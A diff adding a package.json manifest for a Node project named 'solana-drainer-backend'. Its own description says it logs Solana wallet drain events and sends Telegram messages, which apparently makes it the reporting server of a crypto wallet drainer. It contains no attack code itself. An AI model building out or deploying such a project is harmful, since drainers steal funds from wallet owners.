@@ -1,0 +1,23 @@
+{
+  "name": "solana-drainer-backend",
+  "version": "1.0.0",
+  "description": "Backend server to log Solana wallet drain events and send Telegram messages",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "keywords": [
+    "solana",
+    "telegram",
+    "backend",
+    "express"
+  ],
+  "author": "Your Name",
+  "license": "MIT",
+  "dependencies": {
+    "cors": "^2.8.5",
+    "express": "^4.18.2",
+    "node-fetch": "^3.3.1"
+  },
+  "type": "module"
+}
